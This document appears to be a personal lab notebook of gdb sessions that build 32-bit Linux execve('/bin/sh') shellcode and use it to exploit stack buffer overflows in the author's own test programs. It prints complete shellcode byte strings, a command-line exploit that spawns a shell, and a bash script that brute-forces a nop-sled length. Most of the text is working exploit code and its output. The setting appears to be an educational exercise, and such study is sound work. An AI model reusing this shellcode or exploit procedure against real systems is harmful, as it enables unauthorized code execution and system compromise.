(gdb) set var s = 771509048
(gdb) print /x 0x80ec660+(s*4)
$40 = 0xbffff340
(gdb)

Our first line of our patch will be
set var s = 771509048

The rest of the patch will need to formed from our assembly, nasm output, hexdump and vim.
$  objdump -D testya3.o

$ hexdump -s 0x110 -v -e'/1 "set var *((unsigned char *) 0xbffff330 %04_ax) = %#04x\n"' testya3.o  | head

ASIDE: I'm using 330 as start so the leading part for s, ptrs[s] and markers will be in the patch.
set var *((unsigned char *) 0xbffff330 0110) = 0x37
set var *((unsigned char *) 0xbffff330 0111) = 0x37
set var *((unsigned char *) 0xbffff330 0112) = 0x31
set var *((unsigned char *) 0xbffff330 0113) = 0x35
set var *((unsigned char *) 0xbffff330 0114) = 0x30

As you can see, I don't know how to get the offset to print 0 based, but it can help when you 
rewrite the patch in vim column mode.

Rerun the program using the runit.sh and gdbit.sh sequence in screen so the addresses are the same.
If you just run it will be different.  

(gdb) next
(gdb) x/4xw buf
0xbffff330:     0x41414141      0x41414141      0x41414141      0x00000a41
(gdb) refresh
(gdb) source patch6.gdb 
(gdb) next
(gdb) print s
$1 = 771509048
(gdb) print ptrs[s]
$2 = (fptr) 0xbffff350

So, the model part works.  Now lets see what happens we step the code


(gdb) layout next
(gdb) layout next
(gdb) stepi
(gdb) refresh
(gdb) stepi
0xbffff350 in ?? ()  <-- this is our function pointer to the shell
0xbffff363 in ?? ()  <-- this is our jmp to the call instruction
0xbffff352 in ?? ()  <-- this is our call back to start of the shell code
This is the esp prior to the pop 
(gdb) print $esp
$4 = (void *) 0xbffff328
This is the esp after the pop.
(gdb) stepi
0xbffff353 in ?? ()
(gdb) x/4xw $esp
0xbffff368:     0x6e69622f      0x0068732f      0x00000000      0x00000000
(gdb) print /s (char *) ($esp)
$5 = 0xbffff368 "/bin/sh"

So, there is our string.
Whoops, I have an error in my assembly.  Its
not 
mov ebx, esp

Patch up the assembly, nasm it and then patch using individual lines
and then modify eip to rerun it.
(gdb) set var *((unsigned char *) 0xbffff353) = 0x89
(gdb) set var *((unsigned char *) 0xbffff354) = 0xe3
(gdb) print eip
No symbol "eip" in current context.
(gdb) print $eip
$9 = (void (*)()) 0xbffff356
(gdb) set $eip 0xbffff353
A syntax error in expression, near `0xbffff353'.
(gdb) set $eip = 0xbffff353

(gdb) print /x $ebx
$10 = 0x6e69622f
(gdb) stepi
0xbffff355 in ?? ()
(gdb) print /x $ebx
$11 = 0xbffff368
(gdb) print /s ($ebx)
$12 = -1073745048
(gdb) print /x $ebx  
$13 = 0xbffff368
(gdb) print /s (char *) ($ebx)
$14 = 0xbffff368 "/bin/sh"

While writing the assembly, remember this is our goal prior to the int 0x80.
(gdb) print /x $eax
$3 = 0xb
(gdb) print /x $ebx
$4 = 0xbffff374
(gdb) print /x $ecx
$5 = 0xbffff37c
(gdb) x/4w 0xbffff374
0xbffff374:     0x6e69622f      0x0068732f      0xbffff374      0x00000000
(gdb) 

Ok. so that works.  Here is the process from the start
$ ./runit.sh
$ ./gdbit.sh
switch to runit, enter AAAA
switch to gdb
next until tmp assignment.
source patch6.gdb
next
layout next until you get mixed assembly and source
stepi through the code.

right before we do the int80 here is what we have
(gdb) disas 0xbffff350, +24
Dump of assembler code from 0xbffff350 to 0xbffff368:
   0xbffff350:  jmp    0xbffff36f
   0xbffff352:  pop    %esp
   0xbffff353:  mov    %esp,%ebx
   0xbffff355:  add    $0x8,%esp
   0xbffff358:  mov    %ebx,(%esp)
   0xbffff35b:  mov    %esp,%ecx
   0xbffff35d:  mov    %ecx,%eax
   0xbffff35f:  add    $0x4,%eax
   0xbffff362:  xor    %edx,%edx
   0xbffff364:  mov    %edx,(%eax)
   0xbffff366:  xor    %eax,%eax
End of assembler dump.

(gdb) print /x $eax
$7 = 0xb
(gdb) print /x $ebx
$8 = 0xbffff374
(gdb) print /x $ecx
$9 = 0xbffff37c
(gdb) print /x $edx
$10 = 0x0

(gdb) x/24xw 0xbffff330    
0xbffff330:     0x35313737      0x34303930      0x41410038      0x41414141
0xbffff340:     0xbffff350      0x42424242      0x42424242      0x42424242
0xbffff350:     0x895c1deb      0x08c483e3      0x89241c89      0x83c889e1
0xbffff360:     0xd23104c0      0xc0311089      0xc083c289      0xe880cd0b
0xbffff370:     0xffffffde      0x6e69622f      0x0068732f      0xbffff374
0xbffff380:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) 


Now to build the buffer for stdin.  I don't know how to print \ for each char
in hexdump so I print a Y and replace it with \ afterwards.

# To see you are in right location.
# $ hexdump -s 0x110 -v -e'/1 "Y0x%02x"' testya3.o  > foo.txt
$ hexdump -s 0x110 -v -e'/1 "Yx%02x"' testya3.o  > foo.txt
$ sed -i 's/Y/\\/g'  foo.txt
copyls /usr/include/

Then I edit with vim to find the first 0x00 after the null term string for s.

\x37\x37\x31\x35\x30\x39\x30\x34\x38\x00\x41\x41\x41\x41\x41\x41\x50\xf3\xff\xbf\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\xeb\x1d\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00


Notice this buffer will have the leading s in hex instead of the ascii chars.  
Ditto for the markers.  You can touch it up if you wish.


Using this approach on the original problem where we are doing a strcpy.
----------------------------------------------------------------------------

The example code uses a smaller buffer, so my first worry is that the code will
not fit in the buffer.  However, we could use aleph ones approach where we copy
our shell code into the users environment and have our shell code access that.
However, I'm going to just adjust based upon the stack to pad until we find the
return address and exploit it like the secret function demo.

First thing to do is copy the buffer and strip off the leading parts for the
model used by the testy1.c program.



\xeb\x1d\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00



As expected this crashes since we have overwritten the return address.  (We
only had 10 bytes of space for the shell code.  Well, no worries we patch it.

(gdb) step
vulnerable (
    arg=0xbffff8a7 "\353\035\\\211\343\203\304\b\211\034$\211\341\211␉\300\004\0
61҉\020\061\300\211\302\203\300\v̀\350\336\377\377\377/bin/sh")
    at buffer_overflow.c:12
(gdb) layout next
(gdb) stepi
0x080481b0 in ?? ()
(gdb) finish
Run till exit from #0  0x080481b0 in ?? ()

Program received signal SIGSEGV, Segmentation fault.
0xc289c031 in ?? ()
Cannot access memory at address 0xc289c031



So, lets look at the objdump

00000000 <initialStart>:
   0:   eb 1d                   jmp    1f <theCall>

00000002 <theKracken>:
   2:   5c                      pop    %esp
   3:   89 e3                   mov    %esp,%ebx
   5:   83 c4 08                add    $0x8,%esp
   8:   89 1c 24                mov    %ebx,(%esp)
   b:   89 e1                   mov    %esp,%ecx
   d:   89 c8                   mov    %ecx,%eax
   f:   83 c0 04                add    $0x4,%eax
  12:   31 d2                   xor    %edx,%edx

<-- We are trying to interpet the next two instructions 
    as an address for use as a resume address.

  14:   89 10                   mov    %edx,(%eax)
  16:   31 c0                   xor    %eax,%eax
  18:   89 c2                   mov    %eax,%edx
  1a:   83 c0 0b                add    $0xb,%eax
  1d:   cd 80                   int    $0x80

0000001f <theCall>:
  1f:   e8 de ff ff ff          call   2 <theKracken>

00000024 <execvCmdString>:
  24:   2f                      das    
  25:   62 69 6e                bound  %ebp,0x6e(%ecx)
  28:   2f                      das    
  29:   73 68                   jae    93 <execvCmdString+0x6f>
        ...

It does this when it executes the ret instruction as part of the end of
the vulnerable code.  Run it up in gdb and determine address we are 
using at this point. Prior to executing ret,

(gdb) x/4xw $esp
0xbffff6ac:     0xc289c031      0xcd0bc083      0xffdee880      0x622fffff

So we know our code is in memory, but where is the start of it?

(gdb) x/4xw $esp-24
0xbffff694:     0x1debf760      0x83e3895c      0x1c8908c4      0x89e18924

There is our eb 1d. Followed by 5c 89, ...

(gdb) disas 0xbffff696, +22
   |0xbffff696      jmp    0xbffff6b5                                          │
   │0xbffff698      pop    %esp                                                │
   │0xbffff699      mov    %esp,%ebx                                           │
   │0xbffff69b      add    $0x8,%esp                                           │
   │0xbffff69e      mov    %ebx,(%esp)                                         │
   │0xbffff6a1      mov    %esp,%ecx                                           │
   │0xbffff6a3      mov    %ecx,%eax                                           │
   │0xbffff6a5      add    $0x4,%eax                                           │
   │0xbffff6a8      xor    %edx,%edx                                           │
   │0xbffff6aa      mov    %edx,(%eax)                                         │
   │0xbffff6ac      xor    %eax,%eax                                           │
   │0xbffff6ae      mov    %eax,%edx                                           │
   │0xbffff6b0      add    $0xb,%eax                                           │
   │0xbffff6b3      int    $0x80                                               │
   │0xbffff6b5      call   0xbffff698   

So, just patch the assembly file.

[davis@yoshi progs]$ vi testya4.asm 
[davis@yoshi progs]$ make testya4.o
nasm -felf testya4.asm
[davis@yoshi progs]$ hexdump -s 0x110 -v -e'/1 "Yx%02x"' testya4.o  > foo.txt
[davis@yoshi progs]$ sed -i 's/Y/\\/g'  foo.txt


\xeb\x25\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x90\x90\xeb\x04\x86\xf6\xff\xbf\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00

So this will run in gdb.


warning: Could not load shared library symbols for linux-gate.so.1.
Do you need "set solib-search-path" or "set sysroot"?

Breakpoint 1, 0x0805b861 in main ()
(gdb) cont
Continuing.
sh-4.3$ ls
Makefile           foo.o        patch.gdb   shell.o       testy1.c     testya2.o
a.out              gdbit.sh     patch4.gdb  simpleprog    testy1.o     testya3.asm
buffer_overflow    notes.txt    patch5.gdb  simpleprog.c  testy2.c     testya3.o
buffer_overflow.c  notes1.txt   patch6.gdb  simpleprog.o  testya1.asm  withdebug.txt
buffer_overflow.o  notes2.txt   runbin.sh   testy1        testya1.o    withoutall.txt
foo                outfile.txt  shell.asm   testy1.asm    testya2.asm  withoutdebug.txt
sh-4.3$ exit
exit
[Inferior 1 (process 542) exited normally]
(gdb) quit
[davis@vm-i386 progs]$ 

But not when run at cmdline
dmesg shows
[16230.686348] buffer_overflow[590]: segfault at 4741f6c6 ip bffff688 sp bffff6e0 error 4


Not unexpected.  When run under gdb control the ip address could be different.
However, we are not stopped yet.  In previous days, you would get a coredump
file in the directory when this happened however, now you don't.  So, do this

[davis@vm-i386 progs]$ coredumpctl gdb

(gdb) bt
#0  0xbffff688 in ?? ()
Backtrace stopped: Cannot access memory at address 0x4eb9094
(gdb) 

(gdb) print /x $esp
$1 = 0xbffff6e0

Dump of assembler code from 0xbffff6e0 to 0xbffff6f6:
   0xbffff6e0:  xor    %edx,%edx
   0xbffff6e2:  mov    %edx,(%eax)
   0xbffff6e4:  xor    %eax,%eax
   0xbffff6e6:  mov    %eax,%edx
   0xbffff6e8:  add    $0xb,%eax
   0xbffff6eb:  int    $0x80
   0xbffff6ed:  call   0xbffff6c8

That looks like our code

but what is 0x4eb9094 and where did it come from?

(gdb) x/4xw 0xbffff6d0     
0xbffff6d0:     0x89e18924      0x04c083c8      0x04eb9090      0xbffff686

Hmm. So our patch address is 686 but we are at 6d0.  
(Actually, 6d0 not far enough.  Need to move up to the jump)

(gdb) disas /r 0xbffff6c6, +22
Dump of assembler code from 0xbffff6c6 to 0xbffff6dc:
   0xbffff6c6:  eb 25   jmp    0xbffff6ed
   0xbffff6c8:  5c      pop    %esp
   0xbffff6c9:  89 e3   mov    %esp,%ebx
   0xbffff6cb:  83 c4 08        add    $0x8,%esp
   0xbffff6ce:  89 1c 24        mov    %ebx,(%esp)
   0xbffff6d1:  89 e1   mov    %esp,%ecx  
   0xbffff6d3:  89 c8   mov    %ecx,%eax 
   0xbffff6d5:  83 c0 04        add    $0x4,%eax
   0xbffff6d8:  90      nop
   0xbffff6d9:  90      nop
   0xbffff6da:  eb 04   jmp    0xbffff6e0
End of assembler dump.

686 becomes 6C6.  So, lets make that fix.
Just yyGp from above and R

\xeb\x25\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x90\x90\xeb\x04\xc6\xf6\xff\xbf\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00

And now, 

[davis@vm-i386 progs]$ ./buffer_overflow `printf "\xeb\x25\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x90\x90\xeb\x04\xc6\xf6\xff\xbf\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"`
sh-4.3$ ls
Makefile           foo.o        patch.gdb   shell.o       testy1.c     testya2.o
a.out              gdbit.sh     patch4.gdb  simpleprog    testy1.o     testya3.asm
buffer_overflow    notes.txt    patch5.gdb  simpleprog.c  testy2.c     testya3.o
buffer_overflow.c  notes1.txt   patch6.gdb  simpleprog.o  testya1.asm  withdebug.txt
buffer_overflow.o  notes2.txt   runbin.sh   testy1        testya1.o    withoutall.txt
foo                outfile.txt  shell.asm   testy1.asm    testya2.asm  withoutdebug.txt
sh-4.3$ 



Now for the easiest shell of all.  This uses buffer_overflow2.c which has a
buffer big enough that out entire shell code will fit in the read buffer.  I've
already added nops for a landing spot so we can "nop slide" to our code.

$ make buffer_overflow2
$ make testya5.asm
$ hexdump -s 0x110 -v -e'/1 "Yx%02x"' testya5.o  > foo.txt
$ sed -i 's/Y/\\/g'  foo.txt

Once again just pulling out the portion until the first null.  This means that
the buffer in the c program is 50 bytes and our shell code is 44 bytes.  The
stack will have enough space for our shell code.  This means we will not land
in the middle of our code, but this will not overflow the buffer.  We need to
prepend enough nops so that it pushes a nop slide into position for the return
address to be overwritten.

Use this script to determine the number of nops.

[davis@vm-i386 progs]$ cat testy.sh
#!/bin/bash

SHELL_CODE="\xeb\x1d\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"

PREFIX="\x90"

i="0"
while true; do
        i=$[$i+1]
        echo "attempt " $i
        EXEC_LINE="./buffer_overflow2 `printf ${PREFIX}${SHELL_CODE}`"
        ${EXEC_LINE}
        PREFIX=${PREFIX}"\x90"
done

[davis@vm-i386 progs]$ 

When run it looks like this

[davis@vm-i386 progs]$ ./testy.sh 
attempt  1
argv[1] = ��\���$��ȃ�1҉1��
                         ̀�����/bin/sh
attempt  2
argv[1] = ���\���$��ȃ�1҉1��
                          ̀�����/bin/sh
attempt  3
argv[1] = ����\���$��ȃ�1҉1��
                           ̀�����/bin/sh
attempt  4
argv[1] = �����\���$��ȃ�1҉1��
                            ̀�����/bin/sh
attempt  5
argv[1] = ������\���$��ȃ�1҉1��
                             ̀�����/bin/sh
attempt  6
argv[1] = �������\���$��ȃ�1҉1��
                              ̀�����/bin/sh
attempt  7
argv[1] = ��������\���$��ȃ�1҉1��
                               ̀�����/bin/sh
attempt  8
argv[1] = ���������\���$��ȃ�1҉1��
                                ̀�����/bin/sh
attempt  9
argv[1] = ����������\���$��ȃ�1҉1��
                                 ̀�����/bin/sh
attempt  10
argv[1] = �����������\���$��ȃ�1҉1��
                                  ̀�����/bin/sh
attempt  11
argv[1] = ������������\���$��ȃ�1҉1��
                                   ̀�����/bin/sh
attempt  12
argv[1] = �������������\���$��ȃ�1҉1��
                                    ̀�����/bin/sh
attempt  13
argv[1] = ��������������\���$��ȃ�1҉1��
                                     ̀�����/bin/sh
attempt  14
argv[1] = ���������������\���$��ȃ�1҉1��
                                      ̀�����/bin/sh
attempt  15
argv[1] = ����������������\���$��ȃ�1҉1��
                                       ̀�����/bin/sh
sh-4.3$ 

Then you can do 



[davis@vm-i386 progs]$ ./buffer_overflow2 `printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1d\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"`
argv[1] = ����������������\���$��ȃ�1҉1��
                                       ̀�����/bin/sh
sh-4.3$ ls  
Makefile            foo.tx       patch.gdb   simpleprog.c  testya1.o    testya5.o
a.out               foo.txt      patch4.gdb  simpleprog.o  testya2.asm  withdebug.txt
buffer_overflow.c   gdbit.sh     patch5.gdb  testy1        testya2.o    withoutall.txt
buffer_overflow2    notes.txt    patch6.gdb  testy1.asm    testya3.asm  withoutdebug.txt
buffer_overflow2.c  notes1.txt   runbin.sh   testy1.c      testya3.o
buffer_overflow2.o  notes2.txt   shell.asm   testy1.o      testya4.asm
foo                 out.txt      shell.o     testy2.c      testya4.o
foo.o               outfile.txt  simpleprog  testya1.asm   testya5.asm
sh-4.3$ 



##############
Dump of assembler code from 0xbffff8a4 to 0xbffff8c2:
   0xbffff8a4:  jmp    0xbffff8c3
   0xbffff8a6:  pop    %esp
   0xbffff8a7:  mov    %esp,%ebx
   0xbffff8a9:  add    $0x8,%esp
   0xbffff8ac:  mov    %ebx,(%esp)
   0xbffff8af:  mov    %esp,%ecx
   0xbffff8b1:  mov    %ecx,%eax
   0xbffff8b3:  add    $0x4,%eax
   0xbffff8b6:  xor    %edx,%edx
   0xbffff8b8:  mov    %edx,(%eax)
   0xbffff8ba:  xor    %eax,%eax
   0xbffff8bc:  mov    %eax,%edx
   0xbffff8be:  add    $0xb,%eax
   0xbffff8c1:  int    $0x80
End of assembler dump.


